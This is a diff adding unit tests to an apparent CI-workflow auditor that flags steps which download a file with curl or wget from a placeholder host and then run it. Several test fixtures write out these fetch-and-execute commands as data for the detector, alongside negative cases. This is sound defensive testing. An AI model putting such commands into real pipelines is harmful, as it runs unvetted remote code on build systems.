@@ -186,6 +186,70 @@ class RatchetTests(unittest.TestCase):
         )
         self.assertEqual(mod.audit(self.repo, old, self.commit()).new_risky_workflows, 1)
 
+    def test_curl_download_chmod_execute_same_file_denied(self):
+        self.write(
+            "jobs:\n  x:\n    steps:\n"
+            "      - run: curl -fsSLo install.sh https://example.invalid/i && chmod +x install.sh && ./install.sh\n"
+        )
+        self.assertEqual(mod.audit(self.repo, self.base, self.commit()).new_risky_workflows, 1)
+
+    def test_wget_download_direct_execute_no_chmod_denied(self):
+        self.write(
+            "jobs:\n  x:\n    steps:\n"
+            "      - run: wget -qO install.sh https://example.invalid/i && ./install.sh\n"
+        )
+        self.assertEqual(mod.audit(self.repo, self.base, self.commit()).new_risky_workflows, 1)
+
+    def test_curl_stdout_redirect_chmod_execute_denied(self):
+        self.write(
+            "jobs:\n  x:\n    steps:\n"
+            "      - run: curl -fsSL https://example.invalid/i > bootstrap.sh; chmod +x bootstrap.sh; ./bootstrap.sh\n"
+        )
+        self.assertEqual(mod.audit(self.repo, self.base, self.commit()).new_risky_workflows, 1)
+
+    def test_wget_download_absolute_temp_exec_denied(self):
+        self.write(
+            "jobs:\n  x:\n    steps:\n"
+            "      - run: wget -O /tmp/installer https://example.invalid/i && chmod +x /tmp/installer && /tmp/installer\n"
+        )
+        self.assertEqual(mod.audit(self.repo, self.base, self.commit()).new_risky_workflows, 1)
+
+    def test_download_chmod_without_execution_not_proven_remote_code(self):
+        self.write(
+            "jobs:\n  x:\n    steps:\n"
+            "      - run: curl -o installer https://example.invalid/i && chmod +x installer\n"
+        )
+        self.assertEqual(mod.audit(self.repo, self.base, self.commit()).new_risky_workflows, 0)
+
+    def test_download_chmod_other_file_not_proven_direct_execution(self):
+        self.write(
+            "jobs:\n  x:\n    steps:\n"
+            "      - run: curl -o installer https://example.invalid/i && chmod +x different && ./installer\n"
+        )
+        self.assertEqual(mod.audit(self.repo, self.base, self.commit()).new_risky_workflows, 0)
+
+    def test_download_exec_same_prefix_different_file_remains_unflagged(self):
+        self.write(
+            "jobs:\n  x:\n    steps:\n"
+            "      - run: wget -O install https://example.invalid/i && ./install.extra\n"
+        )
+        self.assertEqual(mod.audit(self.repo, self.base, self.commit()).new_risky_workflows, 0)
+
+    def test_download_chmod_execute_unchanged_legacy_only_historical(self):
+        self.write(
+            "jobs:\n  x:\n    steps:\n"
+            "      - run: curl -o install.sh https://example.invalid/i && chmod +x install.sh && ./install.sh\n"
+        )
+        old = self.commit()
+        self.assertEqual(mod.audit(self.repo, old, old).baseline_findings, 1)
+        self.assertEqual(mod.audit(self.repo, old, old).new_risky_workflows, 0)
+        self.write(
+            "jobs:\n  x:\n    steps:\n"
+            "      - run: curl -o install.sh https://example.invalid/i && chmod +x install.sh && ./install.sh\n"
+            "      - run: echo edited\n"
+        )
+        self.assertEqual(mod.audit(self.repo, old, self.commit()).new_risky_workflows, 1)
+
     def test_curl_download_then_bash_same_file_rejected(self):
         self.write(
             "jobs:\n  x:\n    steps:\n      - run: |\n"
